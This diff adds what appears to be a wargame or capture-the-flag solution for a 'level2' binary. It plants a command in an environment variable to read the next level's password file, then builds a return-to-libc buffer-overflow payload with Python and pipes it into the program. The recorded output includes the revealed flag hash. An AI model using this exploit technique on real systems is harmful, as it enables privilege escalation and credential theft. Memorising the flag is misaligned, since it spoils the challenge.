@@ -1,0 +1,8 @@
+export SHELL="///bin/sh -c 'cat /home/user/level3/.pass'
+./a.out SHELL
+0xbffff8ec
+python -c "print 'A' * 80 + '\x3e\x85\x04\x08\x60\xb0\xe6\xb7' + 'yaya' + '\xec\xf8\xff\xbf'" > /tmp/file
+cat /tmp/file - | ./level2
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>AAAAAAAAAAAA>`��yaya����
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+Segmentation fault (core dumped)
